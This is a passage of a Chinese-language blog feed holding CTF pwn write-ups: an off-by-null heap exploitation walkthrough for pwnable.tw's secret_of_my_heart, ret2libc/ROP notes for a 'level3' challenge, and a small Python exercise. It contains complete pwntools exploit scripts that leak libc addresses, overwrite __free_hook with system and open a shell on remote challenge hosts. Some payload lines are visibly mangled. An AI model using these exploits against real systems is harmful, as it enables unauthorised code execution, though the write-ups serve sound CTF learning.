class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_real=u32(p.recv())</span><br><span class="line">write_offset = 0xd43c0</span><br><span class="line">libc_addr = write_real - write_offset</span><br><span class="line">system_addr = libc_addr + 0x3a940</span><br><span class="line">binsh_addr = libc_addr + 0x15902b</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*140+p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://github.com/xfgg/xfgg.git
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off by null漏洞</title>
    <link href="http://yoursite.com/2019/07/27/off%20by%20null%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/07/27/off by null漏洞/</id>
    <published>2019-07-27T14:11:53.766Z</published>
    <updated>2019-07-27T14:31:21.479Z</updated>
    
    <content type="html"><![CDATA[<h3 id="例题讲解"><a href="#例题讲解" class="headerlink" title="例题讲解"></a>例题讲解</h3><p>原文链接：<a href="https://www.anquanke.com/post/id/171283" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171283</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用pwnable.tw里面的secret_of_my_heart作为例题</span><br><span class="line">pwnable.tw不知道我为什么题目取不出来，只能直接学</span><br><span class="line">这个漏洞有点难懂 看了挺久的 为了解决easy_heap那一题</span><br><span class="line">首先介绍这题</span><br><span class="line"></span><br><span class="line">检查</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t01f2284b432b1a2904.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该程序有三个功能</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01bbb8a2557df61293.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分别是add、delete和show功能。</span><br><span class="line">程序刚开始使用mmap函数申请了一块内存:</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t01027558b22eec9cf4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里的mmap出的内存里面主要作用是用来存放一个个secret结构体</span><br><span class="line"></span><br><span class="line">sercet的结构体如下:</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01262ebc1ac1d814f1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下面看一下add函数</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t0125397c8c5ad6f08f.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞点在add函数中的input_str函数中</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t01626f07894f3a1ece.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">红框中的代码有泄露漏洞，可以泄露堆的地址</span><br><span class="line"></span><br><span class="line">而蓝框中的代码则是在输入的最后加上字节”\x00″，这样就造成了offbynull漏洞。</span><br><span class="line"></span><br><span class="line">看一下show函数的内容:</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t0192cd1c5b4e12af0d.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">再看一下delete函数中的内容:</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t012eba25f6ca66c7ab.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、可以通过unsortedbin attack写入到free_hook上方，然后利用fastbin attack写入system的地址，从而拿到shell；</span><br><span class="line"></span><br><span class="line">2、可以通过fastbin attack修改malloc_hook为one_gadget，然后利用malloc_printerr触发malloc；</span><br><span class="line"></span><br><span class="line">3、可以通过fastbin attack修改_IO_FILE文件结构体的vtable中的函数地址为one_gadget来拿到shell；</span><br><span class="line"></span><br><span class="line">4、可以通过fastbin attack修改top chunk指针来劫持top chunk，拿到shell;</span><br></pre></td></tr></table></figure><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">第一种思路的实现</span><br></pre></td></tr></table></figure><p><img src="https://p3.ssl.qhimg.com/t013166d4cb63be868a.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是exp中的各个函数</span><br><span class="line"></span><br><span class="line">首先先去申请5个chunk和泄露堆的地址,大小分别有0x68和0xF8的</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t011505d3c31c553a2d.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">然后进行chunk overlap</span><br><span class="line"></span><br><span class="line">这里的大概思路是，通过3号chunk去溢出4号chunk的prevsize和size，使得当释放4号chunk时，去合并0-3号chunk。这里为了绕过unlink中出现的crash，我们需要先将0号chunk给free掉。 ![](YinXiangBiJi.enexfiles/chunkoverlap.png)</span><br><span class="line"></span><br><span class="line">这里需要说一下，p64(0x0)+p64(0x71)+p64(attack_heap)+p64(0x00)是为后面unsortedbin attack做准备，所以可以暂时忽略，后面的p64(0x100+0x100+0x70+0x70)是伪造的prev_size，这样去free掉4号chunk就可以将0-4号chunk合并并放入unsortedbin中。</span><br><span class="line"></span><br><span class="line">特别说明一下，attack_heap的地址为0x562b0fa382c0。</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01c0adaa3f43192db7.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以看到，这里已经实现了我们的目的。</span><br><span class="line"></span><br><span class="line">然后进行libc地址泄露</span><br></pre></td></tr></table></figure><p><img src="https://p2.ssl.qhimg.com/t010087b8023e052b85.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们已经将0-4号合并的chunk放到了unsortedbin中，但1号chunk实际上并没有被我们free过，所以我们把在unsortedbin中的0号chunk申请掉，malloc就会切割chunk，并将unsortedbin的地址放到1号chunk里面，这时候我们去show1号chunk就可以得到unsortedbin地址了。</span><br><span class="line"></span><br><span class="line">我们已经将libc地址泄露了，接下来我们该如何利用这些chunk拿到shell呢？</span><br><span class="line"></span><br><span class="line">首先，我们先去free掉2号chunk,使得2号chunk放入fastbin中，那么现在堆的布局是怎样的呢？我们来看一下。</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t012e1db7042552fe71.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这样我们就可以通过去unsortedbin中取得内存，来控制0x562b0fa38200中的内容了.</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t01828c065b94d4e0f7.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先new一个0xE8大小的内存。</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t0102a11bac2b395543.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后通过new一块0x70+0x70大小的chunk，控制0x562b0fa38200中的prev_size为0,size为0x71，fd为attack_heap，也就是0x562b0fa382c0</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01c961a6cc0a1acfb0.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看一下0x562b0fa382c0中的情况</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t017fae9d0d3826d99e.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为什么0x562b0fa382c0中为什么回事这样呢，还记得前面吗？</span><br></pre></td></tr></table></figure><p><img src="https://p1.ssl.qhimg.com/t010b034401eba4fbd4.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里我们对0x562b0fa382c0写入了p64(0x0)+p64(0x71)+p64(attack_heap)。</span><br><span class="line"></span><br><span class="line">这样，fastbin中就有了三个chunk，分别是0x562b0fa38200，0x562b0fa382c0，0x562b0fa382c0。</span><br><span class="line"></span><br><span class="line">接下来我们将0x562b0fa38200申请出来，然后通过申请0x562b0fa382c0这个chunk改变第二个0x562b0fa382c0的fd和unsortedbin中的chunk的bk。从而进行fastbin attack和unsortedbin attack。</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t018a8aa6e12d25fe39.png" alt></p><p>还有四种方法自行原文学习 ，学一种我就快die了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> = True</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./secret\_of\_my_heart"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bin_offset = 0x3C4B20 + 0x58</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10302"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line"></span><br><span class="line">bin_offset = 0x3C3B20 + 0x58</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./secret_of_my_heart"</span>)</span><br><span class="line"></span><br><span class="line">def new(size,name,secret):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(1))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Size of heart : "</span>,str(size))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"Name of heart :"</span>,name)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"secret of my heart :"</span>,secret)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(2))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice :"</span>,str(3))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"a"</span>*0x20,<span class="string">"aaaa"</span>)<span class="comment">#0 100</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"b"</span>*0x20,<span class="string">"bbbb"</span>)<span class="comment">#1 100</span></span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"b"</span>*0x20)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recvline()[:-1].ljust(0x8,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_address ===&gt; "</span> + hex(heap_addr))</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"c"</span>*0x20,<span class="string">"cccc"</span>)<span class="comment">#2 70</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"d"</span>*0x20,<span class="string">"dddd"</span>)<span class="comment">#3 70</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"d"</span>*0x20,<span class="string">"dddd"</span>)<span class="comment">#4 100</span></span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"padding\n"</span>,<span class="string">"padding\n"</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line"></span><br><span class="line">offset = 0x55a9d344a2c0 - 0x55a9d344a110</span><br><span class="line"></span><br><span class="line">attack_heap = heap_addr + offset</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"d"</span>*0x20,<span class="string">"d"</span>*0x40 + p64(0x0) + p64(0x71) + p64(attack_heap) + p64(0x00) + p64(0x100+0x100+0x70+0x70)) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"a"</span>*0x20,<span class="string">"aaaa"</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Secret : "</span>)</span><br><span class="line"></span><br><span class="line">bin_addr = u64(p.recvline()[:-1].ljust(0x8,<span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">libc.address = bin_addr - bin_offset</span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_address ===&gt; "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"system_address ===&gt; "</span> + hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"__free_hook ===&gt; "</span> + hex(free_hook))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"attack_heap_address ===&gt; "</span> + hex(attack_heap))</span><br><span class="line"></span><br><span class="line">new(0xE8,<span class="string">"test"</span>,<span class="string">"test"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">new((0x70+0x70),<span class="string">"attack"</span>,p64(0x00)+p64(0x71)+p64(attack_heap)) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"test"</span>,<span class="string">"/bin/sh\x00"</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,p64(free_hook-0x43) + <span class="string">"\x00"</span> * 0x10 + p64(0x101)+p64(0xdeadbeef)+p64(free_hook-0x50))</span><br><span class="line"></span><br><span class="line">new(0xF8,<span class="string">"attack"</span>,<span class="string">"attack"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"\x00"</span> * 0x33 + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,<span class="string">"attack"</span>)</span><br><span class="line"></span><br><span class="line">new(0x68,<span class="string">"attack"</span>,payload)</span><br><span class="line"></span><br><span class="line">free(6)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;例题讲解&quot;&gt;&lt;a href=&quot;#例题讲解&quot; class=&quot;headerlink&quot; title=&quot;例题讲解&quot;&gt;&lt;/a&gt;例题讲解&lt;/h3&gt;&lt;p&gt;原文链接：&lt;a href=&quot;https://www.anquanke.com/post/id/171283&quot; target=
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python100例</title>
    <link href="http://yoursite.com/2019/07/27/python100%E4%BE%8B/"/>
    <id>http://yoursite.com/2019/07/27/python100例/</id>
    <published>2019-07-27T12:01:58.329Z</published>
    <updated>2019-07-27T12:01:36.275Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p> 日常更新</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">题目：有四个数字：1、2、3、4，能组成多少个互不相同且无重复数字的三位数？各是多少？</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,5):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(1,5):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(1,5):</span><br><span class="line">            <span class="keyword">if</span>( i != k ) and (i != j) and (j != k):</span><br><span class="line">                <span class="built_in">print</span> i,j,k</span><br></pre></td></tr></table></figure><h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一题&quot;&gt;&lt;a href=&quot;#第一题&quot; class=&quot;headerlink&quot; title=&quot;第一题&quot;&gt;&lt;/a&gt;第一题&lt;/h3&gt;&lt;p&gt; 日常更新&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="python基础" scheme="http://yoursite.com/categories/python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>babyheap</title>
    <link href="http://yoursite.com/2019/07/27/baby_heap/"/>
    <id>http://yoursite.com/2019/07/27/baby_heap/</id>
    <published>2019-07-27T11:26:14.896Z</published>
    <updated>2019-07-27T11:26:49.538Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="RCTF 2019" scheme="http://yoursite.com/categories/RCTF-2019/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>easy_heap</title>
    <link href="http://yoursite.com/2019/07/27/easy_heap/"/>
    <id>http://yoursite.com/2019/07/27/easy_heap/</id>
    <published>2019-07-27T11:24:51.374Z</published>
    <updated>2019-07-27T11:26:00.113Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="sctf 2019" scheme="http://yoursite.com/categories/sctf-2019/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>level3</title>
    <link href="http://yoursite.com/2019/07/27/level3/"/>
    <id>http://yoursite.com/2019/07/27/level3/</id>
    <published>2019-07-27T11:23:08.790Z</published>
    <updated>2019-07-27T11:43:37.436Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec level3</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/level3'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只有nx保护</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">write(1, <span class="string">"Input:\n"</span>, 7u);</span><br><span class="line"><span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br><span class="line">很明显的栈溢出漏洞，但是没有system函数和/bin/sh字符串了 这里有一个新的模式，泄露函数got表中的地址获取到库中某个函数的真正加载地址，通过偏移找出函数的库，通过然后找出其他函数的真正加载地址，包括system函数也包括/bin/sh字符串</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary level3 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804851b : pop ebp ; ret</span><br><span class="line">0x08048518 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482f1 : pop ebx ; ret</span><br><span class="line">0x0804851a : pop edi ; pop ebp ; ret</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br><span class="line"></span><br><span class="line">我们选中这里作为ROP的位置</span><br><span class="line">0x08048519 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080482da : ret</span><br><span class="line">0x080483ce : ret 0xeac1</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">构造payload: payload=’A’0x88+’A’4+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line"></span><br><span class="line">这一部分是为了泄露出来write 函数的got表内容 payload = “A” 0x88 + “A” 4 + p32(plt_read) + p32(pop_pop_pop_ret) + p32(0) + p32(bss_addr) + p32(8)</span><br><span class="line"></span><br><span class="line">这一部分会返等待输入，把输入的内容放到bss_addr。返回地址pop_pop_pop_ret保证堆栈平衡 payload+=p32(system_addr)+p32(0x77777777)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">这一部分是为了执行system(“/bin/sh”)函数。会执行system(<span class="string">"/bin/sh"</span>)是因为发送过去的payload在函数返回时才会起作用</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret=0x08048519</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">"/home/xfgg/level3"</span>) <span class="comment">##载入level3程序</span></span><br><span class="line"></span><br><span class="line">plt_write=elf.plt[<span class="string">"write"</span>]</span><br><span class="line">got_write=elf.got[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,41869)</span><br><span class="line"><span class="comment">##获取level3的write的plt表和got表</span></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">##因为程序中调用了write()函数，write()函数是从Libc中动态调用的，所以，我们可以根据write()在libc中的地址通过偏移泄露出##libc的版本</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>0x88+<span class="string">"A"</span>4+p32(plt_write)+p32(pop_pop_pop_ret)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line"><span class="comment">## u32():表示unsigned long int,而且只接受4字节就够用了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"write_addr="</span>+hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">##这里泄露libc的版本，运行这段代码就能获取到write函数的运行地址(放在write_addr里面)。 